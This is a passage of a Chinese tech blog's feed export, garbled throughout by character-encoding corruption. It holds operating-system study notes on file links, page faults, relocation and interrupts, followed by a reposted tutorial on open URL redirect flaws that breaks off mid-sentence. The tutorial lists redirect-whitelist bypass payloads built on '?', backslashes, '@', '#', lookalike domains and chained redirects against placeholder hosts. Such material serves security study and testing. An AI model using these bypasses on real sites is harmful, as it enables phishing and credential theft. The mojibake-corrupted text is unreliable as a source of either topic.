ä»ç£ç›˜æ‹·è´åˆ°å†…å­˜ã€‚</p></li><li><p>è®¾å½“å‰å·¥ä½œç›®å½•çš„ä¸»è¦ç›®çš„æ˜¯åŠ å¿«æ–‡ä»¶çš„ç´¢å¼•é€Ÿåº¦</p></li><li><p>è§†é¢‘æ–‡ä»¶å±äºæœ‰ç»“æ„æ–‡ä»¶ä¸­çš„å®šé•¿è®°å½•æ–‡ä»¶ï¼Œé€‚åˆç”¨è¿ç»­åˆ†é…æ¥ç»„ç»‡ï¼Œè¿ç»­åˆ†é…çš„ä¼˜ç‚¹ä¸»è¦æœ‰é¡ºåºè®¿é—®å®¹æ˜“ï¼Œé¡ºåºè®¿é—®é€Ÿåº¦å¿«ã€‚ä¸ºäº†å®ç°å¿«é€Ÿéšæœºæ’­æ”¾ï¼Œè¦ä¿è¯æœ€çŸ­æ—¶é—´æŸ¥è¯¢ï¼Œä¸å®œé€‰å–é“¾å¼å’Œç´¢å¼•ç»“æ„ã€‚</p></li><li><p>Linux è½¯è¿æ¥ä¸ç¡¬é“¾æ¥</p><p>é€šè¿‡æ–‡ä»¶åæ‰“å¼€</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200728220539.png"alt="filename_open" /><figcaption aria-hidden="true">filename_open</figcaption></figure><p>è½¯è¿æ¥ä¸ç¡¬é“¾æ¥</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200728220610.png"alt="hard_soft_principle" /><figcaption aria-hidden="true">hard_soft_principle</figcaption></figure><p>ç¡¬é“¾æ¥</p><p>ç¡¬é“¾æ¥æ˜¯æœ‰ç€ç›¸åŒ inodeå·ä»…æ–‡ä»¶åä¸åŒçš„æ–‡ä»¶ï¼Œå› æ­¤ç¡¬é“¾æ¥å­˜åœ¨ä»¥ä¸‹å‡ ç‚¹ç‰¹æ€§ï¼š</p><ul><li>æ–‡ä»¶æœ‰ç›¸åŒçš„ inode åŠ data blockï¼›</li><li>åªèƒ½å¯¹å·²å­˜åœ¨çš„æ–‡ä»¶è¿›è¡Œåˆ›å»ºï¼›</li><li>ä¸èƒ½äº¤å‰æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œç¡¬é“¾æ¥çš„åˆ›å»ºï¼›</li><li>ä¸èƒ½å¯¹ç›®å½•è¿›è¡Œåˆ›å»ºï¼Œåªå¯å¯¹æ–‡ä»¶åˆ›å»ºï¼›</li><li>åˆ é™¤ä¸€ä¸ªç¡¬é“¾æ¥æ–‡ä»¶å¹¶ä¸å½±å“å…¶ä»–æœ‰ç›¸åŒ inode å·çš„æ–‡ä»¶ã€‚</li></ul><p>è½¯é“¾æ¥</p><p>è½¯é“¾æ¥ä¸ç¡¬é“¾æ¥ä¸åŒï¼Œè‹¥æ–‡ä»¶ç”¨æˆ·æ•°æ®å—ä¸­å­˜æ”¾çš„å†…å®¹æ˜¯å¦ä¸€æ–‡ä»¶çš„è·¯å¾„åçš„æŒ‡å‘ï¼Œåˆ™è¯¥æ–‡ä»¶å°±æ˜¯è½¯è¿æ¥ã€‚è½¯é“¾æ¥å°±æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶ï¼Œåªæ˜¯æ•°æ®å—å†…å®¹æœ‰ç‚¹ç‰¹æ®Šã€‚è½¯é“¾æ¥æœ‰ç€è‡ªå·±çš„inode å·ä»¥åŠç”¨æˆ·æ•°æ®å—ï¼ˆè§ <ahref="https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html#fig2">å›¾2.</a>ï¼‰ã€‚å› æ­¤è½¯é“¾æ¥çš„åˆ›å»ºä¸ä½¿ç”¨æ²¡æœ‰ç±»ä¼¼ç¡¬é“¾æ¥çš„è¯¸å¤šé™åˆ¶ï¼š</p><ul><li>è½¯é“¾æ¥æœ‰è‡ªå·±çš„æ–‡ä»¶å±æ€§åŠæƒé™ç­‰ï¼›</li><li>å¯å¯¹ä¸å­˜åœ¨çš„æ–‡ä»¶æˆ–ç›®å½•åˆ›å»ºè½¯é“¾æ¥ï¼›</li><li>è½¯é“¾æ¥å¯äº¤å‰æ–‡ä»¶ç³»ç»Ÿï¼›</li><li>è½¯é“¾æ¥å¯å¯¹æ–‡ä»¶æˆ–ç›®å½•åˆ›å»ºï¼›</li><li>åˆ›å»ºè½¯é“¾æ¥æ—¶ï¼Œé“¾æ¥è®¡æ•° i_nlinkç›´æ¥å¤åˆ¶ï¼Œä¸ä¼šå¢åŠ ï¼›ä¸”åˆ é™¤åŸæ–‡ä»¶ï¼Œè½¯è¿æ¥æ–‡ä»¶çš„é“¾æ¥è®¡æ•°ä¸å˜ã€‚ï¼ˆå› ä¸ºé“¾æ¥è®¡æ•°æ˜¯é’ˆå¯¹inode çš„ï¼Œè€Œè½¯è¿æ¥æœ‰è‡ªå·±çš„æ–‡ä»¶å±æ€§ã€inodeã€‚ï¼‰</li><li>åˆ é™¤è½¯é“¾æ¥å¹¶ä¸å½±å“è¢«æŒ‡å‘çš„æ–‡ä»¶ï¼Œä½†è‹¥è¢«æŒ‡å‘çš„åŸæ–‡ä»¶è¢«åˆ é™¤ï¼Œåˆ™ç›¸å…³è½¯è¿æ¥è¢«ç§°ä¸ºæ­»é“¾æ¥ï¼ˆè‹¥è¢«æŒ‡å‘è·¯å¾„æ–‡ä»¶è¢«é‡æ–°åˆ›å»ºï¼Œæ­»é“¾æ¥å¯æ¢å¤ä¸ºæ­£å¸¸çš„è½¯é“¾æ¥ï¼‰ã€‚</li></ul></li><li><p>ç›¸å¯¹ç›®å½•</p><p>../ è¡¨ç¤ºå½“å‰ç›®å½•ä¸Šä¸€çº§ ../../ è¡¨ç¤ºå½“å‰ç›®å½•ä¸Šä¸€çº§çš„ä¸Šä¸€çº§ ä»¥æ­¤ç±»æ¨</p><p>./Â  è¡¨ç¤ºå½“å‰ç›®å½•</p></li><li><p>è‹¥æ–‡ä»¶çš„ç´¢å¼•èŠ‚ç‚¹å·²åœ¨å†…å­˜ä¸­ï¼Œé—®è®¿é—®æŸä¸ªæ–‡ä»¶ä¸­æŸä¸ªä½ç½®çš„å†…å®¹ï¼Œéœ€è¦è®¿é—®çš„ç£ç›˜æ¬¡æ•°ã€‚åˆ†æƒ…å†µã€‚</p><ol type="1"><li>å½“è¦è®¿é—®çš„æ–‡ä»¶ä½äºç›´æ¥åœ°å€æ—¶</li><li>å½“è¦è®¿é—®çš„æ–‡ä»¶ä½äºä¸€çº§é—´æ¥åœ°å€æ—¶</li><li>å½“è¦è®¿é—®çš„æ–‡ä»¶ä½äºäºŒçº§é—´æ¥åœ°å€æ—¶</li></ol></li><li><p>æ–‡ä»¶ç´¢å¼•ï¼Œé—®è®¿é—®ç£ç›˜çš„ä¸ªæ•°/æ¬¡æ•°ï¼Œä¸éœ€è¦è½¬æ¢åœ°å€ï¼Œåªéœ€è¦åˆ¤æ–­å¤„äºï¼šç›´æ¥ç´¢å¼•ã€ä¸€çº§ç´¢å¼•ï¼Œè¿˜æ˜¯äºŒçº§ç´¢å¼•å°±å¯ä»¥ã€‚ç›´æ¥æ¯”è¾ƒåœ°å€çš„å¤§å°ã€‚</p></li><li><p>ç¼ºé¡µä¸­æ–­å°±æ˜¯è¦è®¿é—®çš„é¡µä¸åœ¨ä¸»å­˜ï¼Œéœ€è¦æ“ä½œç³»ç»Ÿå°†å…¶è°ƒå…¥ä¸»å­˜åå†è¿›è¡Œè®¿é—®ã€‚</p><p>å› æ­¤ï¼Œå¦‚æœé¢˜ç›®ä¸­æ²¡æœ‰æŒ‡å‡ºï¼šâ€œå¼€å§‹çš„ n ä¸ªé¡µé¢å·²ç»è£…å…¥å†…å­˜â€ï¼Œé‚£ä¹ˆå¼€å§‹å°†é¡µé¢è°ƒå…¥ä¸»å­˜çš„é‚£å‡ æ¬¡ä¹Ÿæ˜¯ç¼ºé¡µä¸­æ–­ã€‚</p><p>ç¼ºé¡µç‡ = ç¼ºé¡µä¸­æ–­æ¬¡æ•° / è®¿é—®é¡µé¢æ€»æ¬¡æ•°ï¼ˆé¡µé¢åºåˆ—çš„é•¿åº¦ï¼‰</p></li></ol><h2 id="æ‚é¡¹">æ‚é¡¹</h2><ol type="1"><li><p><strong>å¯¹ç¨‹åºè¿›è¡Œé‡å®šä½çš„æŠ€æœ¯æŒ‰é‡å®šä½çš„æ—¶æœºå¯åˆ†ä¸ºä¸¤ç§ï¼šé™æ€é‡å®šä½å’ŒåŠ¨æ€é‡å®šä½ã€‚</strong></p><p><strong>é™æ€é‡å®šä½ï¼š</strong></p><p><strong>æ˜¯åœ¨ç›®æ ‡ç¨‹åºè£…å…¥å†…å­˜æ—¶ï¼Œç”±è£…å…¥ç¨‹åºå¯¹ç›®æ ‡ç¨‹åºä¸­çš„æŒ‡ä»¤å’Œæ•°æ®çš„åœ°å€è¿›è¡Œä¿®æ”¹ï¼Œå³æŠŠç¨‹åºçš„é€»è¾‘åœ°å€éƒ½æ”¹æˆå®é™…çš„åœ°å€ã€‚å¯¹æ¯ä¸ªç¨‹åºæ¥è¯´ï¼Œè¿™ç§åœ°å€å˜æ¢åªæ˜¯åœ¨è£…å…¥æ—¶ä¸€æ¬¡å®Œæˆï¼Œåœ¨ç¨‹åºè¿è¡ŒæœŸé—´ä¸å†è¿›è¡Œé‡å®šä½ã€‚</strong></p><blockquote><p>å› æ­¤ï¼Œé™æ€é‡å®šä½åï¼Œä¸å¯èƒ½ä½¿ç”¨ç´§ç¼©æŠ€æœ¯è§£å†³ç¢ç‰‡é—®é¢˜ã€‚</p></blockquote><p><strong>ä¼˜ç‚¹ï¼šæ˜¯æ— éœ€å¢åŠ ç¡¬ä»¶åœ°å€è½¬æ¢æœºæ„ï¼Œä¾¿äºå®ç°ç¨‹åºçš„é™æ€è¿æ¥ã€‚åœ¨æ—©æœŸè®¡ç®—æœºç³»ç»Ÿä¸­å¤§å¤šé‡‡ç”¨è¿™ç§æ–¹æ¡ˆã€‚</strong></p><p><strong>ç¼ºç‚¹ï¼šï¼ˆ1ï¼‰ç¨‹åºçš„å­˜å‚¨ç©ºé—´åªèƒ½æ˜¯è¿ç»­çš„ä¸€ç‰‡åŒºåŸŸï¼Œè€Œä¸”åœ¨é‡å®šä½ä¹‹åå°±ä¸èƒ½å†ç§»åŠ¨ã€‚è¿™ä¸åˆ©äºå†…å­˜ç©ºé—´çš„æœ‰æ•ˆä½¿ç”¨ã€‚ï¼ˆ2ï¼‰å„ä¸ªç”¨æˆ·è¿›ç¨‹å¾ˆéš¾å…±äº«å†…å­˜ä¸­çš„åŒä¸€ç¨‹åºçš„å‰¯æœ¬ã€‚</strong></p><p><strong>åŠ¨æ€é‡å®šä½ï¼š</strong></p><p><strong>æ˜¯åœ¨ç¨‹åºæ‰§è¡ŒæœŸé—´æ¯æ¬¡è®¿é—®å†…å­˜ä¹‹å‰è¿›è¡Œé‡å®šä½ã€‚è¿™ç§å˜æ¢æ˜¯é ç¡¬ä»¶åœ°å€å˜æ¢æœºæ„å®ç°çš„ã€‚é€šå¸¸é‡‡ç”¨ä¸€ä¸ªé‡å®šä½å¯„å­˜å™¨ï¼Œå…¶ä¸­æ”¾æœ‰å½“å‰æ­£åœ¨æ‰§è¡Œçš„ç¨‹åºåœ¨å†…å­˜ç©ºé—´ä¸­çš„èµ·å§‹åœ°å€ï¼Œè€Œåœ°å€ç©ºé—´ä¸­çš„ä»£ç åœ¨è£…å…¥è¿‡ç¨‹ä¸­ä¸å‘ç”Ÿå˜åŒ–ã€‚</strong></p><p><strong>ä¼˜ç‚¹ï¼šï¼ˆ1ï¼‰ç¨‹åºå ç”¨çš„å†…å­˜ç©ºé—´åŠ¨æ€å¯å˜ï¼Œä¸å¿…è¿ç»­å­˜æ”¾åœ¨ä¸€å¤„ã€‚ï¼ˆ2ï¼‰æ¯”è¾ƒå®¹æ˜“å®ç°å‡ ä¸ªè¿›ç¨‹å¯¹åŒä¸€ç¨‹åºå‰¯æœ¬çš„å…±äº«ä½¿ç”¨ã€‚</strong></p><p><strong>ç¼ºç‚¹ï¼šæ˜¯éœ€è¦é™„åŠ çš„ç¡¬ä»¶æ”¯æŒï¼Œå¢åŠ äº†æœºå™¨æˆæœ¬ï¼Œè€Œä¸”å®ç°å­˜å‚¨ç®¡ç†çš„è½¯ä»¶ç®—æ³•æ¯”è¾ƒå¤æ‚ã€‚</strong></p><p><strong>ç°åœ¨ä¸€èˆ¬è®¡ç®—æœºç³»ç»Ÿä¸­éƒ½é‡‡ç”¨åŠ¨æ€é‡å®šä½æ–¹æ³•ã€‚</strong></p><p>åŠ¨æ€é‡å®šä½åœ¨è£…å…¥ä½œä¸šæ—¶ï¼Œä¸è¿›è¡Œåœ°å€è½¬æ¢ã€‚</p></li><li><p>åœ°å€é‡å®šä½æŒ‡çš„æ˜¯ï¼š</p><ol type="1"><li>ä½œä¸šåœ°å€ç©ºé—´å’Œç‰©ç†åœ°å€ç©ºé—´çš„æ˜ å°„ï¼›</li><li>å°†ä½œä¸šçš„é€»è¾‘åœ°å€å˜æ¢ä¸ºä¸»å­˜çš„ç‰©ç†åœ°å€ï¼›</li><li>å°†ä½œä¸šçš„ç›¸å¯¹åœ°å€å˜æ¢ä¸ºä¸»å­˜çš„ç»å¯¹åœ°å€ã€‚</li></ol></li><li><p>å®æ—¶ç³»ç»Ÿçš„åŸºæœ¬ç‰¹å¾ï¼šï¼ˆå¤š äº¤ å¯ åŠ ç‹¬ï¼‰</p><p>å¤šè·¯æ€§ã€äº¤äº’æ€§ã€å¯é æ€§ã€åŠæ—¶æ€§ã€ç‹¬ç«‹æ€§</p></li><li><p>ç³»ç»Ÿè°ƒç”¨æ˜¯æ“ä½œç³»ç»Ÿæä¾›ç»™ç¼–ç¨‹äººå‘˜çš„å”¯ä¸€æ¥å£ã€‚</p><p>ç¨‹åºæ¥å£åˆç§°åº”ç”¨ç¼–ç¨‹æ¥å£ï¼Œç¨‹åºæ¥å£ç”±ä¸€ç»„ç³»ç»Ÿè°ƒç”¨ï¼ˆsystemcallï¼‰ç»„æˆï¼Œè·å¾—æ“ä½œç³»ç»Ÿçš„åº•å±‚æœåŠ¡ï¼Œä½¿ç”¨æˆ–è®¿é—®ç³»ç»Ÿç®¡ç†çš„å„ç§è½¯ç¡¬ä»¶èµ„æº</p></li><li><p>ä¸ç¡¬ä»¶æœ‰å…³çš„æ“ä½œåŠè¿‡ç¨‹</p><ol type="1"><li>é¡µè¡¨æœºåˆ¶</li><li>åœ°å€å˜æ¢æœºæ„</li><li>ç¼ºé¡µä¸­æ–­æœºæ„</li><li>æ—¶é’Ÿç®¡ç†</li></ol></li><li><p>ç°ä»£æ“ä½œç³»ç»Ÿå…·æœ‰å¹¶å‘æ€§ã€å…±äº«æ€§ã€è™šæ‹Ÿæ€§ã€å¼‚æ­¥æ€§ã€‚</p><p>å¼‚æ­¥æ€§ï¼šåœ¨å¤šé“ç¨‹åºç¯å¢ƒä¸‹ï¼Œç¨‹åºæ‰§è¡Œè¿‡ç¨‹çš„ä¸ç¡®å®šæ€§ã€‚</p></li><li><p>ä¸­æ–­ç±»å‹åˆ†ä¸ºå¦‚ä¸‹ä¸¤å¤§ç±»ï¼š</p><p>ä¸€ã€å¼ºè¿«æ€§ä¸­æ–­ï¼šæ­£åœ¨è¿è¡Œçš„ç¨‹åºæ‰€ä¸æœŸæœ›çš„ï¼Œæ¥è‡ªç¡¬ä»¶æ•…éšœæˆ–å¤–éƒ¨è¯·æ±‚ã€‚</p><p>1ã€I/O ä¸­æ–­ï¼šæ¥è‡ªå¤–éƒ¨è®¾å¤‡é€šé“ï¼›</p><p>2ã€ç¨‹åºæ€§ä¸­æ–­ï¼šè¿è¡Œç¨‹åºæœ¬èº«çš„ä¸­æ–­ï¼Œå¦‚æº¢å‡ºã€ç¼ºé¡µä¸­æ–­ã€ç¼ºæ®µä¸­æ–­ã€åœ°å€è¶Šç•Œã€‚</p><p>3ã€æ—¶é’Ÿä¸­æ–­</p><p>4ã€æ§åˆ¶å°ä¸­æ–­</p><p>5ã€ç¡¬ä»¶æ•…éšœ</p><p>äºŒã€è‡ªæ„¿æ€§ä¸­æ–­ï¼šç”¨æˆ·åœ¨ç¼–ç¨‹æ—¶è¦æ±‚æ“ä½œç³»ç»Ÿæä¾›çš„æœåŠ¡ï¼Œä½¿ç”¨è®¿ç®¡æŒ‡ä»¤æˆ–ç³»ç»Ÿè°ƒç”¨ä½¿ä¸­æ–­å‘ç”Ÿã€‚ä¹Ÿç§°ä¸ºè®¿ç®¡ä¸­æ–­ã€‚åŒ…æ‹¬æ‰§è¡ŒI/Oï¼Œåˆ›å»ºè¿›ç¨‹ï¼Œåˆ†é…å†…å­˜ï¼Œä¿¡å·é‡æ“ä½œï¼Œå‘é€/æ¥æ”¶æ¶ˆæ¯</p></li><li><p>åœ¨å•å¤„ç†å™¨ç³»ç»Ÿä¸­ï¼Œå¦‚æœåŒæ—¶å­˜åœ¨æœ‰ 12ä¸ªè¿›ç¨‹ï¼Œåˆ™å¤„äºå°±ç»ªé˜Ÿåˆ—ä¸­çš„è¿›ç¨‹æ•°é‡æœ€å¤šä¸º 11ã€‚</p><p>å¦‚æœåŒæ ¸å¤„ç†ç³»ç»Ÿä¸­çš„è¯ï¼Œå¤„äºå°±ç»ªé˜Ÿåˆ—ä¸­çš„è¿›ç¨‹æ•°é‡æœ€å¤šä¸º 10ã€‚</p><p>å°±ç»ªé˜Ÿåˆ—ä¸­æœ€å¤šçš„è¿›ç¨‹æ•° = æ€»è¿›ç¨‹æ•° - æ ¸æ•°</p></li><li><p>ä»ç”¨æˆ·çš„è§‚ç‚¹çœ‹ï¼Œæ“ä½œç³»ç»Ÿæ˜¯ç”¨æˆ·ä¸è®¡ç®—æœºç¡¬ä»¶ä¹‹é—´çš„æ¥å£ã€‚</p></li><li><p>ç”¨æˆ·ä¸æ“ä½œç³»ç»Ÿçš„æ¥å£å¯ä»¥æ˜¯ï¼š</p><ol type="1"><li>ç³»ç»Ÿè°ƒç”¨</li><li>å‘½ä»¤è§£é‡Šä¸é”®ç›˜å‘½ä»¤</li><li>è”æœºæˆ–äº¤äº’å¼ç”¨æˆ·çš„æ¥å£ã€</li><li>å†…å¤–éƒ¨å‘½ä»¤</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>URL é‡å®šå‘ï¼ˆè½¬è½½ï¼‰</title>
      <link href="/blog/2019/11/23/websec/url_redirect(repost)/"/>
      <url>/blog/2019/11/23/websec/url_redirect(repost)/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¼æ´æè¿°">æ¼æ´æè¿°</h2><p>æœåŠ¡ç«¯æœªå¯¹ä¼ å…¥çš„è·³è½¬ URLå˜é‡è¿›è¡Œæ£€æŸ¥å’Œæ§åˆ¶ï¼Œå¯èƒ½å¯¼è‡´å¯æ¶æ„æ„é€ ä»»æ„ä¸€ä¸ªæ¶æ„åœ°å€ï¼Œè¯±å¯¼ç”¨æˆ·è·³è½¬åˆ°æ¶æ„ç½‘ç«™ã€‚ç”±äºæ˜¯ä»å¯ä¿¡çš„ç«™ç‚¹è·³è½¬å‡ºå»çš„ï¼Œç”¨æˆ·ä¼šæ¯”è¾ƒä¿¡ä»»ï¼Œæ‰€ä»¥è·³è½¬æ¼æ´ä¸€èˆ¬ç”¨äºé’“é±¼æ”»å‡»ï¼Œé€šè¿‡è½¬åˆ°æ¶æ„ç½‘ç«™æ¬ºéª—ç”¨æˆ·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ç›—å–ç”¨æˆ·ä¿¡æ¯ï¼Œæˆ–æ¬ºéª—ç”¨æˆ·è¿›è¡Œé‡‘é’±äº¤æ˜“ï¼›è¿˜å¯ä»¥é€ æˆxss æ¼æ´</p><h2 id="æ¼æ´æ£€æµ‹">æ¼æ´æ£€æµ‹</h2><p>ä¿®æ”¹å‚æ•°ä¸­çš„åˆæ³• URL ä¸ºéæ³•URLï¼Œç„¶åæŸ¥çœ‹æ˜¯å¦èƒ½æ­£å¸¸è·³è½¬æˆ–è€…å“åº”åŒ…æ˜¯å¦åŒ…å«äº†ä»»æ„çš„æ„é€  URL</p><h2 id="ç»•è¿‡-url-è·³è½¬é™åˆ¶">ç»•è¿‡ URL è·³è½¬é™åˆ¶</h2><h3 id="åˆ©ç”¨é—®å·ç»•è¿‡é™åˆ¶">åˆ©ç”¨é—®å·ç»•è¿‡é™åˆ¶</h3><p>æ¯”å¦‚ï¼š<code>http://www.aaa.com/acb?Url=http://login.aaa.com</code>è¿™æ˜¯ä¸€ä¸ªè·³è½¬é“¾æ¥ï¼Œè·³è½¬åˆ°å®ƒçš„äºŒçº§åŸŸåä¸‹ï¼Œé‚£ä¹ˆè¿™ä¸ªé—®å·æ”¾å“ªé‡Œå¯ä»¥ç»•è¿‡å‘¢ï¼Ÿå…¶å®å°±æ˜¯æ”¾åˆ°å®ƒè‡ªèº«çš„åŸŸåå‰é¢ä¹Ÿå°±æ˜¯ä½ æ·»åŠ çš„æƒ³è¦è·³è½¬çš„åŸŸåçš„åé¢ï¼Œå¦‚ï¼š<code>http://www.aaa.com/acb?Url=http://test.com?login.aaa.com</code>ã€‚é‚£ä¹ˆï¼Œå®ƒå…¶å®æ˜¯ä¼šè·³è½¬åˆ°è¿™ä¸ª <code>test.com</code>åŸŸåä¸‹ï¼Œè¿™ä¸ªåŸŸåæ˜¯æˆ‘æƒ³è¦è·³è½¬çš„ä»»æ„åŸŸåï¼Œè€Œåé¢çš„å®ƒè‡ªèº«åŸŸåä¸€å®šè¦å¸¦ä¸Šï¼Œä¸å¸¦ä¸Šå°±æ— æ³•è¾…åŠ©ç”¨é—®å·?è¿™ä¸ªç‰¹æ€§æ¥è·³è½¬åˆ°æŒ‡å®šåŸŸåäº†ï¼Œè€Œè·³è½¬åï¼Œé—®å·å’Œé—®å·åé¢çš„å†…å®¹ä¼šå˜ä¸ºè¿™æ ·ï¼š<code>http://www.test.com/?login.aaa.com</code></p><h3 id="åˆ©ç”¨åæ–œæ å’Œæ­£æ–œæ ç»•è¿‡é™åˆ¶">åˆ©ç”¨åæ–œæ å’Œæ­£æ–œæ ç»•è¿‡é™åˆ¶</h3><p>æ¯”å¦‚ï¼š<code>http://www.aaa.com/acb?Url=http://login.aaa.com/</code>åŒæ ·æ˜¯åœ¨å®ƒæœ¬èº«åŸŸåå‰åŠ ä¸Šæ­£æ–œæ ï¼Œç„¶åæ­£æ–œæ å‰é¢è·Ÿä¸Šä½ æƒ³è·³è½¬çš„åŸŸååœ°å€å¦‚ï¼š<code>http://www.aaa.com/acb?Url=http://test.com/login.aaa.com</code></p><p>åæ–œæ æœ‰ä¸‰ç§æ€è·¯ (1)ä¸¤ä¸ªåæ–œæ ç»•è¿‡æ–¹æ³•æ¯”å¦‚ï¼š<code>http://www.aaa.com/acb?Url=http://login.aaa.com/</code>åŒæ ·æ˜¯åœ¨å®ƒæœ¬èº«åŸŸåå‰åŠ ä¸Šä¸¤ä¸ªåæ–œæ ï¼Œç„¶åä¸¤ä¸ªåæ–œæ å‰é¢è·Ÿä¸Šä½ æƒ³è·³è½¬çš„åŸŸååœ°å€å¦‚ï¼š<code>http://www.aaa.com/acb?Url=http://test.com\\login.aaa.com</code>(2)ä¸€ä¸ªåæ–œæ ç»•è¿‡æ–¹æ³•å¦‚ï¼š<code>http://www.aaa.com/acb?Url=http://test.com\login.aaa.com</code>(3)å¦ä¸€ç§æ€è·¯ï¼Œä¸€ä¸ªåæ–œæ ä¸€ä¸ªç‚¹åˆ©ç”¨.è¿™æ ·çš„æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªåæ–œæ åŠ ä¸€ä¸ªç‚¹æ¥è·³è¿‡é™åˆ¶ï¼Œå¦‚ï¼š<code>http://www.aaa.com/acb?Url=http://test.com\.login.aaa.com</code></p><h3 id="åˆ©ç”¨ç»•è¿‡-url-é™åˆ¶">åˆ©ç”¨@ç»•è¿‡ URL é™åˆ¶</h3><p>å¦‚æœä½ ç”¨è¿™æ–¹æ³•åœ¨ç«ç‹é‡Œè¿›è¡Œè·³è½¬ï¼Œä¼šæœ‰å¼¹çª—æç¤ºï¼Œåœ¨å…¶å®ƒæ¸¸è§ˆå™¨åˆ™æ²¡æœ‰ã€‚å¦‚ï¼šhttp://www.aaa.com/acb?Url=http://login.aaa.com@test.comåé¢çš„test.comå°±æ˜¯è¦è·³è½¬åˆ°çš„åŸŸåï¼Œå‰é¢çš„åŸŸåéƒ½æ˜¯ç”¨æ¥è¾…åŠ©ä»¥ç»•è¿‡é™åˆ¶çš„</p><h3 id="åˆ©ç”¨å·ç»•è¿‡">åˆ©ç”¨#å·ç»•è¿‡</h3><p>å¦‚ï¼šhttp://www.aaa.com/acb?Url=http://test.com#login.aaa.com</p><h3 id="åˆ©ç”¨ç™½åå•ç¼ºé™·ç»•è¿‡é™åˆ¶">åˆ©ç”¨ç™½åå•ç¼ºé™·ç»•è¿‡é™åˆ¶</h3><p>æœ‰çš„åŸŸåç™½åå•é™åˆ¶æ˜¯ä¸å…¨çš„ï¼Œæ¯”å¦‚å¦‚æœæƒ³åˆ©ç”¨ä¸€ä¸ªè·³è½¬ï¼Œè€Œè¿™ä¸ªè·³è½¬æ˜¯é€šç”¨ï¼Œåœ¨è¿™ä¸ªå…¬å¸ç½‘ç«™å¾ˆå¤šå­åŸŸåç­‰éƒ½å¯ä»¥è·³è½¬ï¼Œé‚£ä¹ˆä½ ä¹°ä¸ªåŸŸåä¹Ÿä¸ç®—è´µå¯¹å§ï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Œè¿™ä¸ªé—®é¢˜å°±æ˜¯ç™½åå•é™åˆ¶ä¸å½“ï¼Œæ¯”å¦‚ï¼Œå½“è·³è½¬çš„åŸŸååŒ…å«è¿™ä¸ªç½‘ç«™ä¸‹çš„æ‰€æœ‰åŸŸåï¼Œæ¯”å¦‚ï¼šhttp://www.aaa.com/acb?Url=http://login.aaa.comï¼Œè¿™ä¸ªlogin.aaa.com ä¹Ÿå¯ä»¥æ”¹æˆ aaa.comåŒæ ·å¯ä»¥è·³è½¬å¯¹å§ï¼Œå› ä¸ºç™½åå•é‡Œåªè¦æœ‰åŒ…å«è¿™ä¸ªåŸŸåå°±ç›´æ¥æˆåŠŸè·³è½¬ã€‚é‚£ä¹ˆå½“æˆ‘åœ¨è¿™ä¸ªåŸŸåå‰é¢åŠ ä¸Šå¦‚testaaa.com ï¼Œç™½åå•é‡Œä¼šæ£€æŸ¥æ˜¯å¦åŒ…å« aaa.comè¿™ä¸ªåŸŸåï¼ŒåŒ…å«ï¼Œç„¶åç›´æ¥è·³è½¬ï¼Œè€Œå¹¶æ²¡æœ‰æ£€æŸ¥è¿™ä¸ªåŸŸåçš„æ•´ä¸ªä¿¡æ¯ï¼Œç„¶åå¯ä»¥åˆ©ç”¨è¿™ä¸ªé—®é¢˜ï¼Œç›´æ¥æ³¨å†Œä¸€ä¸ªtestaaa.com è¿™ä¸ªåŸŸåå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·³è½¬ã€‚</p><h3 id="å¤šé‡éªŒè¯è·³è½¬ç»•è¿‡é™åˆ¶">å¤šé‡éªŒè¯&amp;è·³è½¬ç»•è¿‡é™åˆ¶</h3><p>ç°åœ¨å¾ˆå¤šç½‘ç«™éƒ½æœ‰å¤šé‡éªŒè¯ï¼Œæ¯”å¦‚ä½ ç™»é™†è´¦æˆ·åä¼šå‡ºç°å¦ä¸€ä¸ªéªŒè¯é¡µé¢ï¼Œè¾“å…¥æ‰‹æœºéªŒè¯ç è¿›è¡ŒéªŒè¯ï¼Œæ­¤æ—¶è¿™ä¸Šé¢çš„URL å¾ˆå¯èƒ½å­˜åœ¨ä»»æ„è·³è½¬çš„é—®é¢˜ã€‚ å¤šé‡è·³è½¬çš„é—®é¢˜å¯¼è‡´å¯ç»•è¿‡ URL é™åˆ¶ æ¯”å¦‚http://www.aaa.com/acb?Url=http://login.aaa.com/acb?url=http://login.aaa.comã€‚å½“ç„¶ï¼Œè¿˜æœ‰å¤šé‡çš„ï¼Œè¿™ä¸ªç»“æ„çš„å¤šé‡è·³è½¬ä½ ä¿®æ”¹æœ€åé¢çš„ URL å°±å¯ä»¥è¾¾åˆ°ä»»æ„URL è·³è½¬ï¼Œä¸­é—´çš„ URL å°±æ²¡å¿…è¦åŠ¨äº†ã€‚</p><h3 id="ç‚¹å‡»è§¦å‘è¾¾åˆ°ç»•è¿‡-url-è·³è½¬é™åˆ¶">ç‚¹å‡»è§¦å‘è¾¾åˆ°ç»•è¿‡ URLè·³è½¬é™åˆ¶</h3><p>æ¯”å¦‚å¾ˆå¤šç™»é™†é¡µé¢çš„åœ°æ–¹ï¼Œå…¶ URL æ˜¯ä¸€ä¸ªè·³è½¬çš„URLï¼Œå¦‚ï¼šhttp://www.aaa.com/acb?Url=http://test.comã€‚ä½ ç›´æ¥ä¿®æ”¹äº†åé¢ä¸ºä»»æ„URLï¼Œä½†æ˜¯è¿˜æ˜¯åœç•™åœ¨åŸåœ°ï¼Œä¼¼ä¹æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯ï¼Œå½“ä½ è¾“å…¥è´¦å·å’Œå¯†ç åç‚¹å‡»ç™»é™†æŒ‰é’®åï¼Œå°±ä¼šè§¦å‘è·³è½¬ï¼Œå½“ç„¶ï¼Œè¿™ä¸ªè´¦æˆ·å’Œå¯†ç 